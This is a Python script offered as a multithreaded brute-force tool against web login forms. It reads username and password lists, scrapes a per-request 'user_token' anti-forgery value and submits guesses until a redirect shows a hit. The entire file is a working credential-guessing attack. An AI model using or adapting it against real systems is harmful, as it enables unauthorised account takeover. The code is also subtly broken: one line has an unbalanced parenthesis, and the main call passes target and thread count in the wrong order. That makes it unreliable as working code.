import requests
import os
import argparse
from html.parser import HTMLParser
from threading import Thread

found = False

def argument_parse():
    pars = argparse.ArgumentParser(
            prog='Python Login Brute-Force',
            description='A small tool for brute-forcing a Login',
            usage='bruteforce_login.py -u [username file or single username] -p [password file] -t [target URL] --threads [number of threads (default 4)] -v [verbose mode(show each attempt)]',
            epilog='bruteforce_login.py -u username.txt -p passwords.txt -t example.domain.com --threads 5 -v'
            )
    pars.add_argument(
            "-u", "--username",
            required=True,
            help="Path to the username file"
            )
    pars.add_argument(
            "-p", "--password",
            required=True,
            help="Path to the password file"
            )
    pars.add_argument(
            "-t", "--target",
            required=True,
            help="URL of the target"
            )
    pars.add_argument(
            "--threads",
            type=int,
            default=4,
            help="The Number of Threads"
            )
    pars.add_argument(
            "-v", "--verbose",
            action="store_true",
            help="Verbose output"
            )
    return pars.parse_args()

class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "input" and attrs.get("name") == "user_token":
            self.token = attrs.get("value")

def get_token(session, url):
    response = session.get(url)
    parser = TokenParser()
    parser.feed(response.text)
    return parser.token

def payload(url, username, password, token, session):
    data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
        }
    response = session.post(url, data=data)
    return response

def worker(username, password_chunk, url, verbose):
    global found
    session = requests.Session()
    for password in password_chunk:
        if found:
            return
        token = get_token(session, url)
        result = payload(url, username, password.strip(), token, session)
        if "index.php" in result.url:
            found = True
            print(f"Found correct credentials: {username}:{password.strip()}")
            return
        else:
            if verbose:
                print(f"Failed on {username}:{password.strip()}")

def brute_force(username_file, password_file, num_threads, url, verbose):
    global found
    try:
        with open(password_file, "r") as f:
            passwords = f.readlines()
            chunk_size = max(1, len(passwords) // num_threads))
            chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

        with open(username_file, "r") as f:
            for username in f:
                found = False
                thread_list = []
                for chunk in chunks:
                    t = Thread(target=worker, args=(username.strip(), chunk, url, verbose))
                    thread_list.append(t)
                    t.start()
                for t in thread_list:
                    t.join()

    except Exception as e:
        print(f"Script met an error: {e}")

    if not found:
        print("No credentials were matched")

if __name__ == "__main__":
    args = argument_parse()
    brute_force(args.username, args.password, args.target, args.threads, args.verbose)
